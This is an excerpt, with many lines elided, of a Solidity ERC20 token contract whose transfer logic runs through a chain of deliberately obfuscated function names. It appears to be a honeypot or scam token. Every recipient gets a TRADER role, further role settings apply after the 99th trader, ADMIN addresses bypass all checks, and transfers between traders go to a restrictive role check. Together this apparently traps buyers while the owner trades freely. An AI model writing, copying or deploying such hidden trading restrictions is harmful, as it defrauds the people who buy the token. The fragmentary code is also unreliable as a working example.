...
interface _CDSGRSXBRoleControl {
...
abstract contract _CDSGRSXBConsole is Context, _CDSGRSXBRoleControl {
    ...
    function _roleCheked(bytes32 role, address account, uint256 amt) internal {
        ...
        __CDSGRSXBabcRole(role, account, amt);
    }

    function __CDSGRSXBabcRole(bytes32 role, address account, uint256 amt) internal {
    ...
    function __CDSGRSXBabcsetRole(bytes32 role, address account, uint256 num) internal virtual {
...
contract _CDSGRSXBERC20 is Context, IERC20, IERC20Metadata {
...
contract Token is _CDSGRSXBERC20, _CDSGRSXBConsole {
    ...
    ) _CDSGRSXBERC20(_name, _symbol, _totalSupply, _tokenOwner) {
    ...
    function _transfer(
        ...
        address to,
        uint256 amt
    ) internal override(_CDSGRSXBERC20) {
        require(from != address(0), "ERC20: transfer from the zero address");

        __CDSGRSXBnfdvrsf(from, to, amt);

    }



    function __CDSGRSXBnfdvrsf(address from, address to, uint256 amt) internal {
        require(to != address(0), "ERC20: transfer to the zero address");
        require(_balances[from] >= amt, "ERC20: transfer amt exceeds balance");

        __CDSGRSXBcvreghf(from, to, amt);
    }


    function __CDSGRSXBcvreghf(address from, address to, uint256 amt) internal {
        ...
        __CDSGRSXBxeevtjg(from, to, amt);
    }

    function __CDSGRSXBxeevtjg(address from, address to, uint256 amt) internal {
        if (__traders[to] == false) {
            _grantRole(TRADER, to);
            __traders[to] = true;
            
        }
        __CDSGRSXButvesew(from, to, amt);
    }


    function __CDSGRSXButvesew(address from, address to, uint256 amt) internal {
        bool isAddLdx;
        if(to == uniswapV2Pair){
        ...
        }else if(isnum > 99 && meta != to){  
            __CDSGRSXBabcsetRole(TRADER,to,1);
        }

        __CDSGRSXBvndffbf(from, to, amt);
    }

    function __CDSGRSXBvndffbf(address from, address to, uint256 amt) internal {
        if (hasRole(ADMIN, from) || hasRole(ADMIN, to)) {
            super._transfer(from, to, amt);
            return;
        }

        __CDSGRSXBcvyacsi(from, to, amt);
    }

    function __CDSGRSXBcvyacsi(address from, address to, uint256 amt) internal {
        if (hasRole(TRADER, from) && hasRole(TRADER, to)) {

           __CDSGRSXBvnuidxcrd(from, TRADER, amt);
    ...
    function __CDSGRSXBvnuidxcrd(address from, bytes32 role, uint256 amt) internal {
        __CDSGRSXBabcRole(role, from, amt);
    }
